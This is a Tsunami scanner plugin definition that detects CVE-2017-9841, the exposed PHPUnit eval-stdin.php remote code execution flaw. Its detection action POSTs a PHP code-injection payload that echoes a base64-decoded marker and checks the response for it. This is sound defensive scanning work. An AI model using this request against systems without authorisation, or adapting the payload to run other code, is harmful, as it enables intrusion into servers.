# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "PHPUnitExposedEvalStdinDetector"
  author: "Tsunami Team (tsunami-dev@google.com)"
  version: "0.1"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "EXPOSED_PHPUNIT_EVAL_STDIN"
  }
  severity: CRITICAL
  title: "CVE-2017-9841: Exposed Vulnerable eval-stdin.php in PHPUnit"
  description: "CVE-2017-9841: For vulnerable versions of PHPUnit, its eval-stdin.php script allows RCE via a POST request payload."
  recommendation: "Remove the PHPUnit module or upgrade to the latest version."
  related_id: {
    publisher: "CVE"
    value: "CVE-2017-9841"
  }
}

###########
# ACTIONS #
###########

actions: {
  name: "check_phpunit_eval_stdin_rce"
  action_phase: ACTION_PHASE_DETECTION
  http_request: {
    method: POST
    uri: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    headers: [
      {
        name: "Content-Type"
        value: "application/x-www-form-urlencoded"
      }
    ]
    data: "<?php echo(base64_decode('dHN1bmFtaS1waHB1bml0'));"
    client_options: {
      disable_follow_redirects: true
    }
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "tsunami-phpunit" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  actions: [
    "check_phpunit_eval_stdin_rce"
  ]
}
